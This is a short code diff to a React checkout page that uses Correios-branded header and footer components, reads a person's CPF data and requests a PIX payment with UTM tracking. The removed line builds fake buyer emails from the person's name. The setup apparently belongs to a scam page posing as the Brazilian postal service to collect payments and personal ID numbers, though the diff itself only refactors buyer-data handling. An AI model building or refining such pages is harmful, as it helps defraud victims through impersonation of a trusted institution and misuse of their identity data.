@@ -5,6 +5,7 @@ import { CheckCircle, Copy, Clock, Loader2 } from "lucide-react";
 import CorreiosHeader from "@/components/CorreiosHeader";
 import CorreiosFooter from "@/components/CorreiosFooter";
 import { CPFData } from "@/lib/cpf";
+import { normalizeBuyer } from "@/lib/pixBuyer";
 import { toast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
@@ -64,8 +65,9 @@ const Pagamento = () => {
         captureUtmParams();
         const utmParams = getStoredUtmParams();
         console.log('[Pagamento] UTM params for PIX:', utmParams);
+        const buyer = normalizeBuyer(cpfData.nome, cpfData.cpf);
         const response = await supabase.functions.invoke('create-pix', {
-          body: { amount: amountInCents, external_id: externalId, buyer: { name: cpfData.nome, email: `${cpfData.nome.toLowerCase().replace(/\s+/g, '.')}@api.com`, document: cpfData.cpf.replace(/\D/g, '') }, tracking: { utm_source: utmParams.utm_source, utm_medium: utmParams.utm_medium, utm_campaign: utmParams.utm_campaign, utm_content: utmParams.utm_content, utm_term: utmParams.utm_term, utm_id: utmParams.utm_id, src: utmParams.src, sck: utmParams.sck, ref: utmParams.ref } },
+          body: { amount: amountInCents, external_id: externalId, buyer: { name: buyer.name, email: buyer.email, document: buyer.document }, tracking: { utm_source: utmParams.utm_source, utm_medium: utmParams.utm_medium, utm_campaign: utmParams.utm_campaign, utm_content: utmParams.utm_content, utm_term: utmParams.utm_term, utm_id: utmParams.utm_id, src: utmParams.src, sck: utmParams.sck, ref: utmParams.ref } },
         });
         if (response.error) { setPixError('Erro ao gerar PIX. Tente novamente.'); return; }
         const data = response.data;
